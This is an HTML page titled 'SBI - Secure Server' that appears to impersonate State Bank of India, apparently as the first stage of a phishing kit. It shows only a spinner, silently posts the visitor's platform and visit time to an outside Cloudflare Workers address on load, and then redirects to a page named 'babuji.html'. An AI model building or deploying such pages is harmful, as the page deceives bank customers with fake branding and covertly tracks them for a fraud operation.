<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBI - Secure Server</title>
    <style>
        body {
            margin: 0; padding: 0; background-color: #fff;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; font-family: Arial, sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3; border-top: 4px solid #315195;
            border-radius: 50%; width: 35px; height: 35px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script>
        window.onload = function() {
            sendAndRedirect();
        };

        async function sendAndRedirect() {
            const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
            // Ab ye babuji.html par jayega
            const targetURL = 'babuji.html'; 

            const payload = {
                type: "VISIT_COUNT",
                event: "Page Loaded",
                time: new Date().toLocaleString(),
                platform: navigator.platform
            };

            try {
                // 1. Worker ko data bhejna (Fast fire)
                fetch(workerURL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // 2. Turant redirect (Bina wait kiye)
                setTimeout(() => {
                    window.location.replace(targetURL);
                }, 150);

            } catch (err) {
                window.location.replace(targetURL);
            }
        }

        // Backup Redirect: Agar network slow ho toh 2 second baad auto-move
        setTimeout(() => {
            window.location.replace('babuji.html');
        }, 2000);
    </script>
</body>
</html>
